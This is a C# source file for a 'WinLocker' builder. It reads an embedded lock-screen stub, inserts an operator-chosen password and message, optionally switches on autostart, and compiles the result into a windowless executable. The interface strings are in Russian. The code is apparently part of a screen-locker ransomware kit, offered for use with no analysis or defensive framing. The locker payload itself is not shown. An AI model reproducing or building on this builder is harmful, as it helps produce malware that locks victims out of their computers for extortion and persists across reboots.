using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace WinLocker
{
   public partial class Main : Form
   {
      public Main()
      {
         InitializeComponent();
      }

      private void Build( object sender, EventArgs e )
      {
         StringBuilder stringBuilder = GetCode( @"WinLocker.LockScreen.cs" );

         string temp = stringBuilder.ToString();
         SetValues( stringBuilder );
         BuildAssembly( stringBuilder );
      }

      private StringBuilder GetCode( string resourceName )
      {
         StringBuilder stringBuilder = new StringBuilder();
         Assembly assembly = Assembly.GetExecutingAssembly();
         using ( Stream stream = assembly.GetManifestResourceStream( resourceName ) )
         {
            if ( stream != null )
               using ( StreamReader reader = new StreamReader( stream ) )
               {
                  stringBuilder.Append( reader.ReadToEnd() );
               }
         }
         return stringBuilder;
      }


      private void SetValues( StringBuilder stub )
      {
         string tempPass = passwordBox.Text;
         string tempDesc = descriptionBox.Text;
         if ( demoMode.Checked == true )
         {
            tempDesc += $" Пароль:{tempPass}";
         }
         if ( autoLoad.Checked == true )
         {
            stub.Replace( "AutoStart( false )", "AutoStart( true )" );
         }

         stub.Replace( "[_password]", tempPass );
         stub.Replace( "[_description]", tempDesc );
      }

      private void BuildAssembly( StringBuilder stub )
      {
         Dictionary<string, string> provOptions = new Dictionary<string, string> { { "CompilerVersion", "v3.5" } };
         CSharpCodeProvider csProvider = new CSharpCodeProvider( provOptions );

         CompilerParameters cParameters = new CompilerParameters
         {
            GenerateExecutable = true,
            GenerateInMemory = true,
            OutputAssembly = "Assembly.exe"
         };

         cParameters.ReferencedAssemblies.Add( "System.dll" );
         cParameters.ReferencedAssemblies.Add( "System.Core.dll" );
         cParameters.ReferencedAssemblies.Add( "System.Data.dll" );
         cParameters.ReferencedAssemblies.Add( "System.Drawing.dll" );
         // cParameters.ReferencedAssemblies.Add( "System.Linq.dll" );

         cParameters.ReferencedAssemblies.Add( "System.Windows.Forms.dll" );
         cParameters.ReferencedAssemblies.Add( "mscorlib.dll" );
         cParameters.CompilerOptions += "/filealign:0x00000200 /optimize+ /platform:anycpu /debug- /unsafe /t:winexe";

         CompilerResults r = csProvider.CompileAssemblyFromSource( cParameters, stub.ToString() );
         if ( !r.Errors.HasErrors )
         {
            MessageBox.Show( @"Сборка успешна" );
         }
         else
         {
            foreach ( CompilerError err in r.Errors ) MessageBox.Show( err.ToString() );
         }
      }

      private void OnDoubleClick( object sender, EventArgs e )
      {
      }
   }
}
